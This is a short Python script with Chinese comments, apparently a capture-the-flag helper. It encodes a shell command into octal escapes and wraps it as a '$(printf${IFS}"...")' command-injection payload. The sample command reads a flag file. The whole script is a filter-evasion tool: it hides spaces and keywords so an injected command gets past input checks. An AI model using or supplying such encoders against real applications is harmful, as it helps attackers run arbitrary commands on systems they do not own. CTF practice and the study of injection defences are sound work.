
# 八进制编码
def encodeOctal(str):

    # 只显示八进制
    print("八进制")
    for i in str:
        print(oct(ord(i)).replace("0o", "\\"), end="")


    # 显示Linux八进制payload
    print("\nlinux payload")
    payload = '$(printf${IFS}"'
    for i in str:
        payload += oct(ord(i)).replace("0o", "\\")

    payload += '")'
    print(payload)


if __name__ == '__main__':
    str = "cat flag_1s_here/flag_831b69012c67b35f.php"
    encodeOctal(str)